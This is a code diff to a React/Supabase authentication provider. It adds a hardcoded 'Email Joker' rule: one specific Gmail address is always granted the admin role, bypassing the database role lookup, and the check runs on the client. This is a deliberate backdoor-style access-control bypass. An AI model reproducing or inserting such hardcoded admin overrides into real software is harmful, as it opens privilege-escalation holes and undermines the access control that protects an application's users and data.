@@ -43,7 +43,14 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   useEffect(() => {
     // Non-blocking role fetch with fail-safe
-    const fetchUserRole = async (userId: string) => {
+    const fetchUserRole = async (userId: string, email?: string) => {
+      // EMAIL JOKER: Always allow brenzel.ai@gmail.com as admin
+      if (email === 'brenzel.ai@gmail.com') {
+        console.log("[Auth] Email Joker erkannt: brenzel.ai@gmail.com wird Admin.");
+        setRole('admin');
+        return;
+      }
+
       try {
         const { data: profile, error } = await supabase
           .from('profiles')
@@ -76,8 +83,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         setUser(session?.user ?? null);
         
         if (session?.user) {
-          // Trigger role fetch but don't AWAIT it to block the app
-          fetchUserRole(session.user.id);
+          // Trigger role fetch (including email joker check)
+          fetchUserRole(session.user.id, session.user.email);
         }
       } catch (err) {
         console.error("[Auth] Session check failed:", err);
@@ -95,7 +102,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
           setUser(session?.user ?? null);
           
           if (session?.user) {
-            fetchUserRole(session.user.id);
+            fetchUserRole(session.user.id, session.user.email);
           } else {
             setRole('viewer');
           }
